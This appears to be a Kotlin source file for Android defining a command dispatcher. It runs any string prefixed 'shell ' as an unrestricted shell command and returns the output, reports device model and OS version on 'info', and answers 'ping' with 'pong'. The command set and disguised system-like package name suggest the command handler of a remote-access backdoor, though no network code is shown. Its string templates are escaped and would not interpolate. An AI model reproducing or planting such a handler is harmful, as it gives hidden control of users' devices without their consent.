package com.sys.sun

import android.content.Context
import java.io.BufferedReader
import java.io.InputStreamReader

object Dispatch {
    fun run(ctx: Context, cmd: String): String {
        return try {
            when {
                cmd.startsWith("shell ") -> {
                    val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd.replace("shell ", "")))
                    val out = BufferedReader(InputStreamReader(process.inputStream)).readText()
                    process.waitFor()
                    out.ifEmpty { "OK" }
                }
                cmd == "info" -> "Model: \${android.os.Build.MODEL}\nAndroid: \${android.os.Build.VERSION.RELEASE}"
                cmd == "ping" -> "pong"
                else -> "Unknown"
            }
        } catch (e: Exception) { "Error: \${e.message}" }
    }
}
